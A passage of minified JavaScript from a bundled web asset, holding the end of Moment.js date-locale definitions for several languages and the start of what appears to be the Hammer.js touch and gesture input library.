            nextDay: Yt("[Завтра "),
            lastDay: Yt("[Вчора "),
            nextWeek: Yt("[У] dddd ["),
            lastWeek: function() {
                switch (this.day()) {
                case 0:
                case 3:
                case 5:
                case 6:
                    return Yt("[Минулої] dddd [").call(this);
                case 1:
                case 2:
                case 4:
                    return Yt("[Минулого] dddd [").call(this)
                }
            },
            sameElse: "L"
        },
        relativeTime: {
            future: "за %s",
            past: "%s тому",
            s: "декілька секунд",
            m: Dt,
            mm: Dt,
            h: "годину",
            hh: Dt,
            d: "день",
            dd: Dt,
            M: "місяць",
            MM: Dt,
            y: "рік",
            yy: Dt
        },
        meridiemParse: /ночі|ранку|дня|вечора/,
        isPM: function(e) {
            return /^(дня|вечора)$/.test(e)
        },
        meridiem: function(e, t, n) {
            return e < 4 ? "ночі" : e < 12 ? "ранку" : e < 17 ? "дня" : "вечора"
        },
        ordinalParse: /\d{1,2}-(й|го)/,
        ordinal: function(e, t) {
            switch (t) {
            case "M":
            case "d":
            case "DDD":
            case "w":
            case "W":
                return e + "-й";
            case "D":
                return e + "-го";
            default:
                return e
            }
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("uz", {
        months: "январ_феврал_март_апрел_май_июн_июл_август_сентябр_октябр_ноябр_декабр".split("_"),
        monthsShort: "янв_фев_мар_апр_май_июн_июл_авг_сен_окт_ноя_дек".split("_"),
        weekdays: "Якшанба_Душанба_Сешанба_Чоршанба_Пайшанба_Жума_Шанба".split("_"),
        weekdaysShort: "Якш_Душ_Сеш_Чор_Пай_Жум_Шан".split("_"),
        weekdaysMin: "Як_Ду_Се_Чо_Па_Жу_Ша".split("_"),
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "D MMMM YYYY, dddd HH:mm"
        },
        calendar: {
            sameDay: "[Бугун соат] LT [да]",
            nextDay: "[Эртага] LT [да]",
            nextWeek: "dddd [куни соат] LT [да]",
            lastDay: "[Кеча соат] LT [да]",
            lastWeek: "[Утган] dddd [куни соат] LT [да]",
            sameElse: "L"
        },
        relativeTime: {
            future: "Якин %s ичида",
            past: "Бир неча %s олдин",
            s: "фурсат",
            m: "бир дакика",
            mm: "%d дакика",
            h: "бир соат",
            hh: "%d соат",
            d: "бир кун",
            dd: "%d кун",
            M: "бир ой",
            MM: "%d ой",
            y: "бир йил",
            yy: "%d йил"
        },
        week: {
            dow: 1,
            doy: 7
        }
    }),
    _.defineLocale("vi", {
        months: "tháng 1_tháng 2_tháng 3_tháng 4_tháng 5_tháng 6_tháng 7_tháng 8_tháng 9_tháng 10_tháng 11_tháng 12".split("_"),
        monthsShort: "Th01_Th02_Th03_Th04_Th05_Th06_Th07_Th08_Th09_Th10_Th11_Th12".split("_"),
        monthsParseExact: !0,
        weekdays: "chủ nhật_thứ hai_thứ ba_thứ tư_thứ năm_thứ sáu_thứ bảy".split("_"),
        weekdaysShort: "CN_T2_T3_T4_T5_T6_T7".split("_"),
        weekdaysMin: "CN_T2_T3_T4_T5_T6_T7".split("_"),
        weekdaysParseExact: !0,
        meridiemParse: /sa|ch/i,
        isPM: function(e) {
            return /^ch$/i.test(e)
        },
        meridiem: function(e, t, n) {
            return e < 12 ? n ? "sa" : "SA" : n ? "ch" : "CH"
        },
        longDateFormat: {
            LT: "HH:mm",
            LTS: "HH:mm:ss",
            L: "DD/MM/YYYY",
            LL: "D MMMM [năm] YYYY",
            LLL: "D MMMM [năm] YYYY HH:mm",
            LLLL: "dddd, D MMMM [năm] YYYY HH:mm",
            l: "DD/M/YYYY",
            ll: "D MMM YYYY",
            lll: "D MMM YYYY HH:mm",
            llll: "ddd, D MMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[Hôm nay lúc] LT",
            nextDay: "[Ngày mai lúc] LT",
            nextWeek: "dddd [tuần tới lúc] LT",
            lastDay: "[Hôm qua lúc] LT",
            lastWeek: "dddd [tuần rồi lúc] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "%s tới",
            past: "%s trước",
            s: "vài giây",
            m: "một phút",
            mm: "%d phút",
            h: "một giờ",
            hh: "%d giờ",
            d: "một ngày",
            dd: "%d ngày",
            M: "một tháng",
            MM: "%d tháng",
            y: "một năm",
            yy: "%d năm"
        },
        ordinalParse: /\d{1,2}/,
        ordinal: function(e) {
            return e
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("x-pseudo", {
        months: "J~áñúá~rý_F~ébrú~árý_~Márc~h_Áp~ríl_~Máý_~Júñé~_Júl~ý_Áú~gúst~_Sép~témb~ér_Ó~ctób~ér_Ñ~óvém~bér_~Décé~mbér".split("_"),
        monthsShort: "J~áñ_~Féb_~Már_~Ápr_~Máý_~Júñ_~Júl_~Áúg_~Sép_~Óct_~Ñóv_~Déc".split("_"),
        monthsParseExact: !0,
        weekdays: "S~úñdá~ý_Mó~ñdáý~_Túé~sdáý~_Wéd~ñésd~áý_T~húrs~dáý_~Fríd~áý_S~átúr~dáý".split("_"),
        weekdaysShort: "S~úñ_~Móñ_~Túé_~Wéd_~Thú_~Frí_~Sát".split("_"),
        weekdaysMin: "S~ú_Mó~_Tú_~Wé_T~h_Fr~_Sá".split("_"),
        weekdaysParseExact: !0,
        longDateFormat: {
            LT: "HH:mm",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY HH:mm",
            LLLL: "dddd, D MMMM YYYY HH:mm"
        },
        calendar: {
            sameDay: "[T~ódá~ý át] LT",
            nextDay: "[T~ómó~rró~w át] LT",
            nextWeek: "dddd [át] LT",
            lastDay: "[Ý~ést~érdá~ý át] LT",
            lastWeek: "[L~ást] dddd [át] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "í~ñ %s",
            past: "%s á~gó",
            s: "á ~féw ~sécó~ñds",
            m: "á ~míñ~úté",
            mm: "%d m~íñú~tés",
            h: "á~ñ hó~úr",
            hh: "%d h~óúrs",
            d: "á ~dáý",
            dd: "%d d~áýs",
            M: "á ~móñ~th",
            MM: "%d m~óñt~hs",
            y: "á ~ýéár",
            yy: "%d ý~éárs"
        },
        ordinalParse: /\d{1,2}(th|st|nd|rd)/,
        ordinal: function(e) {
            var t = e % 10;
            return e + (1 == ~~(e % 100 / 10) ? "th" : 1 == t ? "st" : 2 == t ? "nd" : 3 == t ? "rd" : "th")
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("yo", {
        months: "Sẹ́rẹ́_Èrèlè_Ẹrẹ̀nà_Ìgbé_Èbibi_Òkùdu_Agẹmo_Ògún_Owewe_Ọ̀wàrà_Bélú_Ọ̀pẹ̀̀".split("_"),
        monthsShort: "Sẹ́r_Èrl_Ẹrn_Ìgb_Èbi_Òkù_Agẹ_Ògú_Owe_Ọ̀wà_Bél_Ọ̀pẹ̀̀".split("_"),
        weekdays: "Àìkú_Ajé_Ìsẹ́gun_Ọjọ́rú_Ọjọ́bọ_Ẹtì_Àbámẹ́ta".split("_"),
        weekdaysShort: "Àìk_Ajé_Ìsẹ́_Ọjr_Ọjb_Ẹtì_Àbá".split("_"),
        weekdaysMin: "Àì_Aj_Ìs_Ọr_Ọb_Ẹt_Àb".split("_"),
        longDateFormat: {
            LT: "h:mm A",
            LTS: "h:mm:ss A",
            L: "DD/MM/YYYY",
            LL: "D MMMM YYYY",
            LLL: "D MMMM YYYY h:mm A",
            LLLL: "dddd, D MMMM YYYY h:mm A"
        },
        calendar: {
            sameDay: "[Ònì ni] LT",
            nextDay: "[Ọ̀la ni] LT",
            nextWeek: "dddd [Ọsẹ̀ tón'bọ] [ni] LT",
            lastDay: "[Àna ni] LT",
            lastWeek: "dddd [Ọsẹ̀ tólọ́] [ni] LT",
            sameElse: "L"
        },
        relativeTime: {
            future: "ní %s",
            past: "%s kọjá",
            s: "ìsẹjú aayá die",
            m: "ìsẹjú kan",
            mm: "ìsẹjú %d",
            h: "wákati kan",
            hh: "wákati %d",
            d: "ọjọ́ kan",
            dd: "ọjọ́ %d",
            M: "osù kan",
            MM: "osù %d",
            y: "ọdún kan",
            yy: "ọdún %d"
        },
        ordinalParse: /ọjọ́\s\d{1,2}/,
        ordinal: "ọjọ́ %d",
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("zh-cn", {
        months: "一月_二月_三月_四月_五月_六月_七月_八月_九月_十月_十一月_十二月".split("_"),
        monthsShort: "1月_2月_3月_4月_5月_6月_7月_8月_9月_10月_11月_12月".split("_"),
        weekdays: "星期日_星期一_星期二_星期三_星期四_星期五_星期六".split("_"),
        weekdaysShort: "周日_周一_周二_周三_周四_周五_周六".split("_"),
        weekdaysMin: "日_一_二_三_四_五_六".split("_"),
        longDateFormat: {
            LT: "Ah点mm分",
            LTS: "Ah点m分s秒",
            L: "YYYY-MM-DD",
            LL: "YYYY年MMMD日",
            LLL: "YYYY年MMMD日Ah点mm分",
            LLLL: "YYYY年MMMD日ddddAh点mm分",
            l: "YYYY-MM-DD",
            ll: "YYYY年MMMD日",
            lll: "YYYY年MMMD日Ah点mm分",
            llll: "YYYY年MMMD日ddddAh点mm分"
        },
        meridiemParse: /凌晨|早上|上午|中午|下午|晚上/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "凌晨" === t || "早上" === t || "上午" === t || "下午" !== t && "晚上" !== t && 11 <= e ? e : e + 12
        },
        meridiem: function(e, t, n) {
            var i = 100 * e + t;
            return i < 600 ? "凌晨" : i < 900 ? "早上" : i < 1130 ? "上午" : i < 1230 ? "中午" : i < 1800 ? "下午" : "晚上"
        },
        calendar: {
            sameDay: function() {
                return 0 === this.minutes() ? "[今天]Ah[点整]" : "[今天]LT"
            },
            nextDay: function() {
                return 0 === this.minutes() ? "[明天]Ah[点整]" : "[明天]LT"
            },
            lastDay: function() {
                return 0 === this.minutes() ? "[昨天]Ah[点整]" : "[昨天]LT"
            },
            nextWeek: function() {
                var e, t;
                return e = _().startOf("week"),
                t = 7 <= this.diff(e, "days") ? "[下]" : "[本]",
                0 === this.minutes() ? t + "dddAh点整" : t + "dddAh点mm"
            },
            lastWeek: function() {
                var e, t;
                return e = _().startOf("week"),
                t = this.unix() < e.unix() ? "[上]" : "[本]",
                0 === this.minutes() ? t + "dddAh点整" : t + "dddAh点mm"
            },
            sameElse: "LL"
        },
        ordinalParse: /\d{1,2}(日|月|周)/,
        ordinal: function(e, t) {
            switch (t) {
            case "d":
            case "D":
            case "DDD":
                return e + "日";
            case "M":
                return e + "月";
            case "w":
            case "W":
                return e + "周";
            default:
                return e
            }
        },
        relativeTime: {
            future: "%s内",
            past: "%s前",
            s: "几秒",
            m: "1 分钟",
            mm: "%d 分钟",
            h: "1 小时",
            hh: "%d 小时",
            d: "1 天",
            dd: "%d 天",
            M: "1 个月",
            MM: "%d 个月",
            y: "1 年",
            yy: "%d 年"
        },
        week: {
            dow: 1,
            doy: 4
        }
    }),
    _.defineLocale("zh-hk", {
        months: "一月_二月_三月_四月_五月_六月_七月_八月_九月_十月_十一月_十二月".split("_"),
        monthsShort: "1月_2月_3月_4月_5月_6月_7月_8月_9月_10月_11月_12月".split("_"),
        weekdays: "星期日_星期一_星期二_星期三_星期四_星期五_星期六".split("_"),
        weekdaysShort: "週日_週一_週二_週三_週四_週五_週六".split("_"),
        weekdaysMin: "日_一_二_三_四_五_六".split("_"),
        longDateFormat: {
            LT: "Ah點mm分",
            LTS: "Ah點m分s秒",
            L: "YYYY年MMMD日",
            LL: "YYYY年MMMD日",
            LLL: "YYYY年MMMD日Ah點mm分",
            LLLL: "YYYY年MMMD日ddddAh點mm分",
            l: "YYYY年MMMD日",
            ll: "YYYY年MMMD日",
            lll: "YYYY年MMMD日Ah點mm分",
            llll: "YYYY年MMMD日ddddAh點mm分"
        },
        meridiemParse: /凌晨|早上|上午|中午|下午|晚上/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "凌晨" === t || "早上" === t || "上午" === t ? e : "中午" === t ? 11 <= e ? e : e + 12 : "下午" === t || "晚上" === t ? e + 12 : void 0
        },
        meridiem: function(e, t, n) {
            var i = 100 * e + t;
            return i < 600 ? "凌晨" : i < 900 ? "早上" : i < 1130 ? "上午" : i < 1230 ? "中午" : i < 1800 ? "下午" : "晚上"
        },
        calendar: {
            sameDay: "[今天]LT",
            nextDay: "[明天]LT",
            nextWeek: "[下]ddddLT",
            lastDay: "[昨天]LT",
            lastWeek: "[上]ddddLT",
            sameElse: "L"
        },
        ordinalParse: /\d{1,2}(日|月|週)/,
        ordinal: function(e, t) {
            switch (t) {
            case "d":
            case "D":
            case "DDD":
                return e + "日";
            case "M":
                return e + "月";
            case "w":
            case "W":
                return e + "週";
            default:
                return e
            }
        },
        relativeTime: {
            future: "%s內",
            past: "%s前",
            s: "幾秒",
            m: "1 分鐘",
            mm: "%d 分鐘",
            h: "1 小時",
            hh: "%d 小時",
            d: "1 天",
            dd: "%d 天",
            M: "1 個月",
            MM: "%d 個月",
            y: "1 年",
            yy: "%d 年"
        }
    }),
    _.defineLocale("zh-tw", {
        months: "一月_二月_三月_四月_五月_六月_七月_八月_九月_十月_十一月_十二月".split("_"),
        monthsShort: "1月_2月_3月_4月_5月_6月_7月_8月_9月_10月_11月_12月".split("_"),
        weekdays: "星期日_星期一_星期二_星期三_星期四_星期五_星期六".split("_"),
        weekdaysShort: "週日_週一_週二_週三_週四_週五_週六".split("_"),
        weekdaysMin: "日_一_二_三_四_五_六".split("_"),
        longDateFormat: {
            LT: "Ah點mm分",
            LTS: "Ah點m分s秒",
            L: "YYYY年MMMD日",
            LL: "YYYY年MMMD日",
            LLL: "YYYY年MMMD日Ah點mm分",
            LLLL: "YYYY年MMMD日ddddAh點mm分",
            l: "YYYY年MMMD日",
            ll: "YYYY年MMMD日",
            lll: "YYYY年MMMD日Ah點mm分",
            llll: "YYYY年MMMD日ddddAh點mm分"
        },
        meridiemParse: /凌晨|早上|上午|中午|下午|晚上/,
        meridiemHour: function(e, t) {
            return 12 === e && (e = 0),
            "凌晨" === t || "早上" === t || "上午" === t ? e : "中午" === t ? 11 <= e ? e : e + 12 : "下午" === t || "晚上" === t ? e + 12 : void 0
        },
        meridiem: function(e, t, n) {
            var i = 100 * e + t;
            return i < 600 ? "凌晨" : i < 900 ? "早上" : i < 1130 ? "上午" : i < 1230 ? "中午" : i < 1800 ? "下午" : "晚上"
        },
        calendar: {
            sameDay: "[今天]LT",
            nextDay: "[明天]LT",
            nextWeek: "[下]ddddLT",
            lastDay: "[昨天]LT",
            lastWeek: "[上]ddddLT",
            sameElse: "L"
        },
        ordinalParse: /\d{1,2}(日|月|週)/,
        ordinal: function(e, t) {
            switch (t) {
            case "d":
            case "D":
            case "DDD":
                return e + "日";
            case "M":
                return e + "月";
            case "w":
            case "W":
                return e + "週";
            default:
                return e
            }
        },
        relativeTime: {
            future: "%s內",
            past: "%s前",
            s: "幾秒",
            m: "1 分鐘",
            mm: "%d 分鐘",
            h: "1 小時",
            hh: "%d 小時",
            d: "1 天",
            dd: "%d 天",
            M: "1 個月",
            MM: "%d 個月",
            y: "1 年",
            yy: "%d 年"
        }
    }),
    _.locale("en"),
    _
}),
function(s, o, c) {
    "use strict";
    var r, l = ["", "webkit", "Moz", "MS", "ms", "o"], e = o.createElement("div"), n = "function", d = Math.round, h = Math.abs, m = Date.now;
    function u(e, t, n) {
        return setTimeout(g(e, n), t)
    }
    function i(e, t, n) {
        return Array.isArray(e) && (f(e, n[t], n),
        1)
    }
    function f(e, t, n) {
        var i;
        if (e)
            if (e.forEach)
                e.forEach(t, n);
            else if (e.length !== c)
                for (i = 0; i < e.length; )
                    t.call(n, e[i], i, e),
                    i++;
            else
                for (i in e)
                    e.hasOwnProperty(i) && t.call(n, e[i], i, e)
    }
    function t(i, e, t) {
        var a = "DEPRECATED METHOD: " + e + "\n" + t + " AT \n";
        return function() {
            var e = new Error("get-stack-trace")
              , t = e && e.stack ? e.stack.replace(/^[^\(]+?[\n$]/gm, "").replace(/^\s+at\s+/gm, "").replace(/^Object.<anonymous>\s*\(/gm, "{anonymous}()@") : "Unknown Stack Trace"
              , n = s.console && (s.console.warn || s.console.log);
            return n && n.call(s.console, a, t),
            i.apply(this, arguments)
        }
    }
    r = "function" != typeof Object.assign ? function(e) {
        if (e === c || null === e)
            throw new TypeError("Cannot convert undefined or null to object");
        for (var t = Object(e), n = 1; n < arguments.length; n++) {
            var i = arguments[n];
            if (i !== c && null !== i)
                for (var a in i)
                    i.hasOwnProperty(a) && (t[a] = i[a])
        }
        return t
    }
    : Object.assign;
    var a = t(function(e, t, n) {
        for (var i = Object.keys(t), a = 0; a < i.length; )
            (!n || n && e[i[a]] === c) && (e[i[a]] = t[i[a]]),
            a++;
        return e
    }, "extend", "Use `assign`.")
      , p = t(function(e, t) {
        return a(e, t, !0)
    }, "merge", "Use `assign`.");
    function _(e, t, n) {
        var i, a = t.prototype;
        (i = e.prototype = Object.create(a)).constructor = e,
        i._super = a,
        n && r(i, n)
    }
    function g(e, t) {
        return function() {
            return e.apply(t, arguments)
        }
    }
    function y(e, t) {
        return typeof e == n ? e.apply(t && t[0] || c, t) : e
    }
    function v(e, t) {
        return e === c ? t : e
    }
    function M(t, e, n) {
        f(D(e), function(e) {
            t.addEventListener(e, n, !1)
        })
    }
    function L(t, e, n) {
        f(D(e), function(e) {
            t.removeEventListener(e, n, !1)
        })
    }
    function b(e, t) {
        for (; e; ) {
            if (e == t)
                return !0;
            e = e.parentNode
        }
        return !1
    }
    function k(e, t) {
        return -1 < e.indexOf(t)
    }
    function D(e) {
        return e.trim().split(/\s+/g)
    }
    function Y(e, t, n) {
        if (e.indexOf && !n)
            return e.indexOf(t);
        for (var i = 0; i < e.length; ) {
            if (n && e[i][n] == t || !n && e[i] === t)
                return i;
            i++
        }
        return -1
    }
    function w(e) {
        return Array.prototype.slice.call(e, 0)
    }
    function T(e, n, t) {
        for (var i = [], a = [], s = 0; s < e.length; ) {
            var r = n ? e[s][n] : e[s];
            Y(a, r) < 0 && i.push(e[s]),
            a[s] = r,
            s++
        }
        return t && (i = n ? i.sort(function(e, t) {
            return e[n] > t[n]
        }) : i.sort()),
        i
    }
    function S(e, t) {
        for (var n, i, a = t[0].toUpperCase() + t.slice(1), s = 0; s < l.length; ) {
            if ((i = (n = l[s]) ? n + a : t)in e)
                return i;
            s++
        }
        return c
    }
    var x = 1;
    function H(e) {
        var t = e.ownerDocument || e;
        return t.defaultView || t.parentWindow || s
    }
    var E = "ontouchstart"in s
      , j = S(s, "PointerEvent") !== c
      , C = E && /mobile|tablet|ip(ad|hone|od)|android/i.test(navigator.userAgent)
      , A = "touch"
      , P = 25
      , O = 1
      , N = 4
      , F = 8
      , W = 1
      , I = 2
      , z = 4
      , R = 8
      , $ = 16
      , B = I | z
      , q = R | $
      , U = B | q
      , J = ["x", "y"]
      , V = ["clientX", "clientY"];
    function G(t, e) {
        var n = this;
        this.manager = t,
        this.callback = e,
        this.element = t.element,
        this.target = t.options.inputTarget,
        this.domHandler = function(e) {
            y(t.options.enable, [t]) && n.handler(e)
        }
        ,
        this.init()
    }
    function X(e, t, n) {
        var i = n.pointers.length
          , a = n.changedPointers.length
          , s = t & O && i - a == 0
          , r = t & (N | F) && i - a == 0;
        n.isFirst = !!s,
        n.isFinal = !!r,
        s && (e.session = {}),
        n.eventType = t,
        function(e, t) {
            var n = e.session
              , i = t.pointers
              , a = i.length;
            n.firstInput || (n.firstInput = K(t));
            1 < a && !n.firstMultiple ? n.firstMultiple = K(t) : 1 === a && (n.firstMultiple = !1);
            var s = n.firstInput
              , r = n.firstMultiple
              , o = r ? r.center : s.center
              , l = t.center = Q(i);
            t.timeStamp = m(),
            t.deltaTime = t.timeStamp - s.timeStamp,
            t.angle = ne(o, l),
            t.distance = te(o, l),
            function(e, t) {
                var n = t.center
                  , i = e.offsetDelta || {}
                  , a = e.prevDelta || {}
                  , s = e.prevInput || {};
                t.eventType !== O && s.eventType !== N || (a = e.prevDelta = {
                    x: s.deltaX || 0,
                    y: s.deltaY || 0
                },
                i = e.offsetDelta = {
                    x: n.x,
                    y: n.y
                });
                t.deltaX = a.x + (n.x - i.x),
                t.deltaY = a.y + (n.y - i.y)
            }(n, t),
            t.offsetDirection = ee(t.deltaX, t.deltaY);
            var d = Z(t.deltaTime, t.deltaX, t.deltaY);
            t.overallVelocityX = d.x,
            t.overallVelocityY = d.y,
            t.overallVelocity = h(d.x) > h(d.y) ? d.x : d.y,
            t.scale = r ? function(e, t) {
                return te(t[0], t[1], V) / te(e[0], e[1], V)
            }(r.pointers, i) : 1,
            t.rotation = r ? function(e, t) {
                return ne(t[1], t[0], V) + ne(e[1], e[0], V)
            }(r.pointers, i) : 0,
            t.maxPointers = !n.prevInput || t.pointers.length > n.prevInput.maxPointers ? t.pointers.length : n.prevInput.maxPointers,
            function(e, t) {
                var n, i, a, s, r = e.lastInterval || t, o = t.timeStamp - r.timeStamp;
                if (t.eventType != F && (P < o || r.velocity === c)) {
                    var l = t.deltaX - r.deltaX
                      , d = t.deltaY - r.deltaY
                      , u = Z(o, l, d);
                    i = u.x,
                    a = u.y,
                    n = h(u.x) > h(u.y) ? u.x : u.y,
                    s = ee(l, d),
                    e.lastInterval = t
                } else
                    n = r.velocity,
                    i = r.velocityX,
                    a = r.velocityY,
                    s = r.direction;
                t.velocity = n,
                t.velocityX = i,
                t.velocityY = a,
                t.direction = s
            }(n, t);
            var u = e.element;
            b(t.srcEvent.target, u) && (u = t.srcEvent.target);
            t.target = u
        }(e, n),
        e.emit("hammer.input", n),
        e.recognize(n),
        e.session.prevInput = n
    }
    function K(e) {
        for (var t = [], n = 0; n < e.pointers.length; )
            t[n] = {
                clientX: d(e.pointers[n].clientX),
                clientY: d(e.pointers[n].clientY)
            },
            n++;
        return {
            timeStamp: m(),
            pointers: t,
            center: Q(t),
            deltaX: e.deltaX,
            deltaY: e.deltaY
        }
    }
    function Q(e) {
        var t = e.length;
        if (1 === t)
            return {
                x: d(e[0].clientX),
                y: d(e[0].clientY)
            };
        for (var n = 0, i = 0, a = 0; a < t; )
            n += e[a].clientX,
            i += e[a].clientY,
            a++;
        return {
            x: d(n / t),
            y: d(i / t)
        }
    }
    function Z(e, t, n) {
        return {
            x: t / e || 0,
            y: n / e || 0
        }
    }
    function ee(e, t) {
        return e === t ? W : h(e) >= h(t) ? e < 0 ? I : z : t < 0 ? R : $
    }
    function te(e, t, n) {
        var i = t[(n = n || J)[0]] - e[n[0]]
          , a = t[n[1]] - e[n[1]];
        return Math.sqrt(i * i + a * a)
    }
    function ne(e, t, n) {
        var i = t[(n = n || J)[0]] - e[n[0]]
          , a = t[n[1]] - e[n[1]];
        return 180 * Math.atan2(a, i) / Math.PI
    }
    G.prototype = {
        handler: function() {},
        init: function() {
            this.evEl && M(this.element, this.evEl, this.domHandler),
            this.evTarget && M(this.target, this.evTarget, this.domHandler),
            this.evWin && M(H(this.element), this.evWin, this.domHandler)
        },
        destroy: function() {
            this.evEl && L(this.element, this.evEl, this.domHandler),
            this.evTarget && L(this.target, this.evTarget, this.domHandler),
            this.evWin && L(H(this.element), this.evWin, this.domHandler)
        }
    };
    var ie = {
        mousedown: O,
        mousemove: 2,
        mouseup: N
    }
      , ae = "mousedown"
      , se = "mousemove mouseup";
    function re() {
        this.evEl = ae,
        this.evWin = se,
        this.pressed = !1,
        G.apply(this, arguments)
    }
    _(re, G, {
        handler: function(e) {
            var t = ie[e.type];
            t & O && 0 === e.button && (this.pressed = !0),
            2 & t && 1 !== e.which && (t = N),
            this.pressed && (t & N && (this.pressed = !1),
            this.callback(this.manager, t, {
                pointers: [e],
                changedPointers: [e],
                pointerType: "mouse",
                srcEvent: e
            }))
        }
    });
    var oe = {
        pointerdown: O,
        pointermove: 2,
        pointerup: N,
        pointercancel: F,
        pointerout: F
    }
      , le = {
        2: A,
        3: "pen",
        4: "mouse",
        5: "kinect"
    }
      , de = "pointerdown"
      , ue = "pointermove pointerup pointercancel";
    function ce() {
        this.evEl = de,
        this.evWin = ue,
        G.apply(this, arguments),
        this.store = this.manager.session.pointerEvents = []
    }
    s.MSPointerEvent && !s.PointerEvent && (de = "MSPointerDown",
    ue = "MSPointerMove MSPointerUp MSPointerCancel"),
    _(ce, G, {
        handler: function(e) {
            var t = this.store
              , n = !1
              , i = e.type.toLowerCase().replace("ms", "")
              , a = oe[i]
              , s = le[e.pointerType] || e.pointerType
              , r = s == A
              , o = Y(t, e.pointerId, "pointerId");
            a & O && (0 === e.button || r) ? o < 0 && (t.push(e),
            o = t.length - 1) : a & (N | F) && (n = !0),
            o < 0 || (t[o] = e,
            this.callback(this.manager, a, {
                pointers: t,
                changedPointers: [e],
                pointerType: s,
                srcEvent: e
            }),
            n && t.splice(o, 1))
        }
    });
    var he = {
        touchstart: O,
        touchmove: 2,
        touchend: N,
        touchcancel: F
    };
    function me() {
        this.evTarget = "touchstart",
        this.evWin = "touchstart touchmove touchend touchcancel",
        this.started = !1,
        G.apply(this, arguments)
    }
    _(me, G, {
        handler: function(e) {
            var t = he[e.type];
            if (t === O && (this.started = !0),
            this.started) {
                var n = function(e, t) {
                    var n = w(e.touches)
                      , i = w(e.changedTouches);
                    t & (N | F) && (n = T(n.concat(i), "identifier", !0));
                    return [n, i]
                }
                .call(this, e, t);
                t & (N | F) && n[0].length - n[1].length == 0 && (this.started = !1),
                this.callback(this.manager, t, {
                    pointers: n[0],
                    changedPointers: n[1],
                    pointerType: A,
                    srcEvent: e
                })
            }
        }
    });
    var fe = {
        touchstart: O,
        touchmove: 2,
        touchend: N,
        touchcancel: F
    }
      , pe = "touchstart touchmove touchend touchcancel";
    function _e() {
        this.evTarget = pe,
        this.targetIds = {},
        G.apply(this, arguments)
    }
    _(_e, G, {
        handler: function(e) {
            var t = fe[e.type]
              , n = function(e, t) {
                var n = w(e.touches)
                  , i = this.targetIds;
                if (t & (2 | O) && 1 === n.length)
                    return i[n[0].identifier] = !0,
                    [n, n];
                var a, s, r = w(e.changedTouches), o = [], l = this.target;
                if (s = n.filter(function(e) {
                    return b(e.target, l)
                }),
                t === O)
                    for (a = 0; a < s.length; )
                        i[s[a].identifier] = !0,
                        a++;
                a = 0;
                for (; a < r.length; )
                    i[r[a].identifier] && o.push(r[a]),
                    t & (N | F) && delete i[r[a].identifier],
                    a++;
                return o.length ? [T(s.concat(o), "identifier", !0), o] : void 0
            }
            .call(this, e, t);
            n && this.callback(this.manager, t, {
                pointers: n[0],
                changedPointers: n[1],
                pointerType: A,
                srcEvent: e
            })
        }
    });
    var ge = 2500;
    function ye() {
        G.apply(this, arguments);
        var e = g(this.handler, this);
        this.touch = new _e(this.manager,e),
        this.mouse = new re(this.manager,e),
        this.primaryTouch = null,
        this.lastTouches = []
    }
    function ve(e) {
        var t = e.changedPointers[0];
        if (t.identifier === this.primaryTouch) {
            var n = {
                x: t.clientX,
                y: t.clientY
            };
            this.lastTouches.push(n);
            var i = this.lastTouches;
            setTimeout(function() {
                var e = i.indexOf(n);
                -1 < e && i.splice(e, 1)
            }, ge)
        }
    }
    _(ye, G, {
        handler: function(e, t, n) {
            var i = n.pointerType == A
              , a = "mouse" == n.pointerType;
            if (!(a && n.sourceCapabilities && n.sourceCapabilities.firesTouchEvents)) {
                if (i)
                    (function(e, t) {
                        e & O ? (this.primaryTouch = t.changedPointers[0].identifier,
                        ve.call(this, t)) : e & (N | F) && ve.call(this, t)
                    }
                    ).call(this, t, n);
                else if (a && function(e) {
                    for (var t = e.srcEvent.clientX, n = e.srcEvent.clientY, i = 0; i < this.lastTouches.length; i++) {
                        var a = this.lastTouches[i]
                          , s = Math.abs(t - a.x)
                          , r = Math.abs(n - a.y);
                        if (s <= 25 && r <= 25)
                            return !0
                    }
                    return !1
                }
                .call(this, n))
                    return;
                this.callback(e, t, n)
            }
        },
        destroy: function() {
            this.touch.destroy(),
            this.mouse.destroy()
        }
    });
    var Me = S(e.style, "touchAction")
      , Le = Me !== c
      , be = "manipulation"
      , ke = "none"
      , De = "pan-x"
      , Ye = "pan-y"
      , we = function() {
        if (!Le)
            return !1;
        var t = {}
          , n = s.CSS && s.CSS.supports;
        return ["auto", "manipulation", "pan-y", "pan-x", "pan-x pan-y", "none"].forEach(function(e) {
            t[e] = !n || s.CSS.supports("touch-action", e)
        }),
        t
    }();
    function Te(e, t) {
        this.manager = e,
        this.set(t)
    }
    Te.prototype = {
        set: function(e) {
            "compute" == e && (e = this.compute()),
            Le && this.manager.element.style && we[e] && (this.manager.element.style[Me] = e),
            this.actions = e.toLowerCase().trim()
        },
        update: function() {
            this.set(this.manager.options.touchAction)
        },
        compute: function() {
            var t = [];
            return f(this.manager.recognizers, function(e) {
                y(e.options.enable, [e]) && (t = t.concat(e.getTouchAction()))
            }),
            function(e) {
                if (k(e, ke))
                    return ke;
                var t = k(e, De)
                  , n = k(e, Ye);
                if (t && n)
                    return ke;
                if (t || n)
                    return t ? De : Ye;
                if (k(e, be))
                    return be;
                return "auto"
            }(t.join(" "))
        },
        preventDefaults: function(e) {
            var t = e.srcEvent
              , n = e.offsetDirection;
            if (this.manager.session.prevented)
                t.preventDefault();
            else {
                var i = this.actions
                  , a = k(i, ke) && !we.none
                  , s = k(i, Ye) && !we[Ye]
                  , r = k(i, De) && !we[De];
                if (a) {
                    var o = 1 === e.pointers.length
                      , l = e.distance < 2
                      , d = e.deltaTime < 250;
                    if (o && l && d)
                        return
                }
                if (!r || !s)
                    return a || s && n & B || r && n & q ? this.preventSrc(t) : void 0
            }
        },
        preventSrc: function(e) {
            this.manager.session.prevented = !0,
            e.preventDefault()
        }
    };
    var Se = 1;
    function xe(e) {
